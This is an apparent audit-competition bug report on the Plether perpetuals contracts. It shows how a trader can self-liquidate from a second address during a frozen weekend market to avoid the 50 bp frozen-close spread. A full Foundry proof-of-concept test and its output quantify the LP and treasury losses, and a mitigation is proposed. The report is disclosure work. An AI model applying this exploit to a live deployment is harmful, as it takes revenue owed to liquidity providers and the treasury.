# \#98492 [SC-Medium] In a frozen (weekend) market a trader can exit through self-liquidation and skip the 50 bp frozen-close spread, paying about 1/5 of the price the spread was meant to charge

**Submitted on Nov 8th 2026 at 08:09:55 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98492
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

### Brief/Intro

In an oracle-frozen window a voluntary close is charged `executionFee + frozenSpread` (4 bp + 50 bp of notional). The spread is the LPs' price for the stale-price exit option (`SECURITY.md:836-845`). A liquidation in the same window executes at the same cached mark but charges only the liquidation bounty (10 bp of notional, split 50/50 keeper/LP) and **no spread and no execution fee**. Liquidation is permissionless and the trader's own address can be the keeper, so the trader gets half the charge back. A trader who can choose when their position becomes liquidatable can therefore pick the cheap exit.

### Plain Summary (and where the uncertainty is)

1. At the weekend the market is closed. The protocol keeps using Friday's price.
2. A trader who wants to leave at that stale price could know the real price has moved. So the protocol charges a **50 bp "frozen spread"** (plus a 4 bp fee) on a normal close. This protects the LPs.
3. A **liquidation** is a second way out. It charges only **10 bp**, no fee and no spread.
4. The trader sets the margin so that, after some weekend carry, the position falls just under the liquidation line.
5. The trader then liquidates themselves with a second address they own. Half of the 10 bp comes straight back to them.
6. They leave at the same price as a normal close but pay about 1/5 of the cost. In the PoC, on a $1M position: **961 USDG instead of 4,612 USDG**. The LPs lose 3,251 USDG of spread, the treasury loses 400 USDG of fee.
7. **The uncertainty:** `SECURITY.md:843-845` says liquidation "do[es] not assess the spread" and calls it "a deliberate trade-off". I read that as the reason for *forced* liquidations. The docs do not say that a trader can choose to be liquidated to avoid the spread. 

### Vulnerability Details

Voluntary frozen close, spread added to the cost:

```solidity
// libraries/CloseAccountingLib.sol:120-127
uint256 notionalAssets = (inputs.sizeDelta * inputs.oraclePrice) / CfdMath.ASSETS_TO_TOKEN_SCALE;
state.executionFeeAssets = (notionalAssets * inputs.executionFeeBps) / 10_000;
if (inputs.oracleFrozen) {
@>  state.frozenSpreadAssets = (notionalAssets * inputs.frozenCloseSpreadBps) / 10_000;   // 50 bp
}
state.netSettlementAssets = state.realizedPnlAssets - state.vpiDeltaAssets
    - int256(state.executionFeeAssets + state.frozenSpreadAssets);
```

Liquidation settlement (`CfdEnginePlanLib.sol:1476-1548`, `_applyLiquidationSettlement`) takes only the capped keeper/LP charge (`bountyBps = 10`, `keeperShareBps = 5000`) and returns the remaining equity to the trader. It has no `frozenSpreadAssets` and no `executionFeeAssets` term. `frozenCloseSpreadBps` is only fed into the close plan (`CfdEnginePlanLib.sol:1343`). `SECURITY.md:843` states this on purpose: "liquidation pricing and settlement retain adverse-confidence pricing and do not assess the spread".

Why the trader controls it:

- Frozen markets use a 3 % margin line (`fadMarginBps = 300`). The trader picks the margin at open (any value above the 0.2 % initial margin) and withdraws all free balance, so carry reduces equity during the weekend and the account crosses the line after some hours.
- The keeper role is permissionless (`router.executeLiquidation`). The attacker uses a second address, so the keeper share of the charge returns to them.
- Frozen liquidation uses an empty price payload and replays the cached mark, the same mark a voluntary close would use.
- Code read, not part of the PoC: `CfdEngine.addMargin` (`CfdEngine.sol:501-520`) shows no frozen-market gate, so the trader appears able to postpone the crossing and decide whether to exit this way.

### Impact Details

No principal is lost. The invariant that does not hold: **an exit at the cached mark in a frozen window should cost at least the priced frozen-close spread.** Today the same exit through liquidation costs about 1/5.

PoC, $1M LONG, deployed release parameters, cached mark 1.00, same state, two exits:

| Exit | Attacker net (A + own keeper A2) | LP accounted revenue |
|---|---|---|
| Voluntary frozen close (4 bp fee + 50 bp spread) | -4,612.05 USDG | +4,212.05 USDG |
| Self-liquidation (10 bp charge, 5 bp back to own keeper) | -961.15 USDG | +961.15 USDG |
| Difference | attacker saves **3,650.90 USDG** | LPs forgo **3,250.90 USDG** (treasury forgoes the 400 USDG fee) |

- Scales linearly with notional: about 3,251 USDG LP revenue and 400 USDG treasury fee per $1M.
- Upper bound is the open interest that can use this path. Skew is capped at `maxSkewRatio 0.4` of the pool, about $2M net skew on a 5M USDG pool.
- Attacker cost and limits: margin must be tuned to roughly 150 USDG per $1M (about one hour of carry; in my search 32,500 USDG was liquidated already at FAD start, 32,650 USDG survived it and crossed after about 1.5 frozen hours). Capital sits at about 3.3 % margin over the weekend.
- Third parties cannot be pushed into liquidation this way: liquidation equity uses only the account's own pledge, claim and price PnL, so skew and pool utilisation do not move it.

### Mitigation

Charge the frozen spread on any liquidation that executes in a frozen window when the liquidator is the account owner or their delegate, or charge `min(frozenSpread, residual equity)` on every frozen liquidation and route it to the LP as the voluntary close does. If forced liquidations must stay spread-free, document that a deliberate self-liquidation is a cheaper weekend exit than a close and that this is accepted.

### References

- `packages/perps/src/libraries/CloseAccountingLib.sol:120-127`: frozen spread and execution fee in the close cost
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:1343`: `frozenCloseSpreadBps` passed only into the close plan
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:1476-1548`: `_applyLiquidationSettlement`, no spread and no execution fee
- `packages/perps/src/CfdEngine.sol:501-520`: `addMargin`, no frozen-market gate (code read)
- `packages/perps/SECURITY.md:836-845`: spread purpose, liquidation does not assess the spread, "deliberate trade-off"
- `packages/perps/SECURITY.md:1332-1341`: stale-mark exit option in the frozen window is a documented limitation

## Proof of Concept

## Proof of Concept

Save as `packages/perps/test/u07/FrozenSelfLiquidationSpread.t.sol` and run `forge test --root packages/perps --offline --match-path test/u07/FrozenSelfLiquidationSpread.t.sol -vv`.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";

/// Deployed-release params (DEPLOYMENT.md:128-158). Pyth confidence 8 bps. Mock Pyth only.
contract FrozenSelfLiquidationSpreadPoC is BasePerpTest {
    uint256 internal constant Q = 1e20; // 1 lot = 100 USD notional at price 1e8
    uint256 internal constant FRI = 1_710_460_800; // Fri 2024-03-15 00:00 UTC
    address internal constant A = address(0xA11A); // attacker trader
    address internal constant A2 = address(0xA11B); // attacker's own keeper
    address internal constant KEEP = address(0xE0EC); // honest keeper
    uint64 internal constant CONF = 80_000; // 8 bps of 1e8

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18, maxSkewRatio: 0.4e18, maintMarginBps: 10, initMarginBps: 20, fadMarginBps: 300,
            baseCarryBps: 500, minBountyAssets: 1e6, bountyBps: 10, keeperShareBps: 5000, protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) { return 1_000_000e6; }
    function _initialSeniorDeposit() internal pure override returns (uint256) { return 4_000_000e6; }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.minOpenNotionalAssets = 1_000e6;
        rc.adverseConfidenceMultiplierBps = 2_500;
        rc.maxPendingOrders = 5;
        routerAdmin.proposeRouterConfig(rc);
        IHousePool.PoolConfig memory pc = _currentPoolConfig();
        pc.maxSeniorExposureAssets = 40_000_000e6;
        pc.maxSeniorShareBps = 8_000;
        pool.proposePoolConfig(pc);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        routerAdmin.finalizeRouterConfig();
        vm.warp((vm.getBlockTimestamp() / 1 hours + 1) * 1 hours + 1);
        router.updateMarkPrice(_fresh(1e8, 0));
        pool.finalizePoolConfig();
    }

    // ------------------------------------------------------------ helpers
    function _fresh(uint256 price, uint64 prev) internal returns (bytes[] memory data) {
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(uint64(price)), CONF, -8, uint64(vm.getBlockTimestamp()), prev
        );
        data = new bytes[](1);
        data[0] = abi.encode(price);
    }

    function _to(uint256 t) internal {
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _wealth(address a) internal view returns (uint256) {
        return settlementToken.balanceOf(a) + clearinghouse.balanceAssets(a);
    }

    function _openLong(address who, uint256 lots, uint256 margin) internal {
        vm.prank(who);
        uint64 oid = router.commitOrder(CfdTypes.Side.LONG, lots * Q, margin, 0, false);
        for (uint256 i; i < 4; ++i) {
            (IOrderRouterAccounting.PendingOrderView memory pv,) = router.getPendingOrderView(oid);
            bytes[] memory d = _fresh(1e8, pv.commitTime);
            vm.prank(KEEP);
            OrderV3Types.ExecutionResult memory r = router.executeOrder(oid, d);
            if (r.status != OrderV3Types.LifecycleStatus.Pending) {
                require(r.terminalReason == OrderV3Types.TerminalReason.Executed, "open not executed");
                return;
            }
        }
        revert("stuck");
    }

    /// Liquidation through the real router. frozen => empty payload (cached-mark replay).
    function _liquidate(address who, address keeper, bool frozen) internal returns (bool ok) {
        bytes[] memory d = frozen ? new bytes[](0) : _fresh(1e8, 0);
        if (frozen) vm.roll(vm.getBlockNumber() + 1);
        vm.prank(keeper);
        try router.executeLiquidation(who, d) { ok = true; } catch {}
    }

    function _frozenClose(address who) internal returns (OrderV3Types.ExecutionResult memory r) {
        (uint256 size,,,, CfdTypes.Side side,,) = engine.positions(who);
        vm.prank(who);
        uint64 oid = router.commitOrder(side, size, 0, 0, true);
        _to(vm.getBlockTimestamp() + 1);
        vm.prank(who);
        r = router.executeOrder(oid, new bytes[](0));
    }

    // ------------------------------------------------------------ PoC
    function test_FrozenSelfLiquidationSkipsSpread() public {
        // Friday 12:00 UTC (market open): A opens a $1M LONG with margin tuned just above the 3% frozen-market margin
        _to(FRI + 12 hours);
        _fundTrader(A, 100_000e6);
        _openLong(A, 10_000, 32_650e6);
        uint256 free = clearinghouse.getAccountAssetBuckets(A).freeSettlementAssets;
        vm.prank(A);
        clearinghouse.withdraw(A, free); // nothing left to cover carry

        // Fri 20:30:05 = FAD start. An honest keeper cannot liquidate A yet.
        _to(FRI + 20 hours + 30 minutes + 5);
        assertFalse(_liquidate(A, KEEP, false), "A must survive FAD start");

        // Fri 20:59:50: last mark refresh at 1.00. Then ~1.5 h into the closed window.
        _to(FRI + 21 hours - 10);
        router.updateMarkPrice(_fresh(1e8, 0));
        _to(FRI + 21 hours + 30 minutes + 1 hours);
        assertTrue(engine.isOracleFrozen(), "oracle frozen");

        uint256 w0 = _wealth(A) + _wealth(A2);
        uint256 p0 = pool.accountedAssets();
        uint256 snap = vm.snapshotState();

        // (a) honest path: voluntary close. 4 bps fee + 50 bps frozen spread.
        OrderV3Types.ExecutionResult memory r = _frozenClose(A);
        assertEq(uint8(r.terminalReason), uint8(OrderV3Types.TerminalReason.Executed), "close executed");
        int256 netClose = int256(_wealth(A) + _wealth(A2)) - int256(w0);
        int256 lpClose = int256(pool.accountedAssets()) - int256(p0);
        vm.revertToState(snap);

        // (b) same state, same cached mark: A exits through liquidation by its own keeper A2.
        assertTrue(_liquidate(A, A2, true), "frozen liquidation");
        (uint256 sizeAfter,,,,,,) = engine.positions(A);
        assertEq(sizeAfter, 0, "position closed");
        int256 netLiq = int256(_wealth(A) + _wealth(A2)) - int256(w0);
        int256 lpLiq = int256(pool.accountedAssets()) - int256(p0);

        emit log_named_int("attacker net, voluntary frozen close (USDG, 6dp)", netClose);
        emit log_named_int("attacker net, self-liquidation       (USDG, 6dp)", netLiq);
        emit log_named_int("LP accounted revenue, close          (USDG, 6dp)", lpClose);
        emit log_named_int("LP accounted revenue, self-liq       (USDG, 6dp)", lpLiq);
        emit log_named_int("LP revenue forgone                   (USDG, 6dp)", lpClose - lpLiq);

        assertGt(netLiq - netClose, int256(3_000e6), "self-liquidation exit is > 3,000 USDG cheaper per $1M");
        assertGt(lpClose - lpLiq, int256(3_000e6), "LP forgoes > 3,000 USDG per $1M");
    }
}
```

Result (actually run, same command):

```
Ran 1 test for test/u07/FrozenSelfLiquidationSpread.t.sol:FrozenSelfLiquidationSpreadPoC
[PASS] test_FrozenSelfLiquidationSkipsSpread() (gas: 4972664)
Logs:
  attacker net, voluntary frozen close (USDG, 6dp): -4612054874
  attacker net, self-liquidation       (USDG, 6dp): -961154936
  LP accounted revenue, close          (USDG, 6dp): 4212054874
  LP accounted revenue, self-liq       (USDG, 6dp): 961154936
  LP revenue forgone                   (USDG, 6dp): 3250899938

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

Reading the output: from the same state and the same cached mark, the voluntary close costs the attacker 4,612.05 USDG and pays the LPs 4,212.05 USDG. The self-liquidation costs 961.15 USDG and pays the LPs 961.15 USDG. The LPs forgo 3,250.90 USDG per $1M.

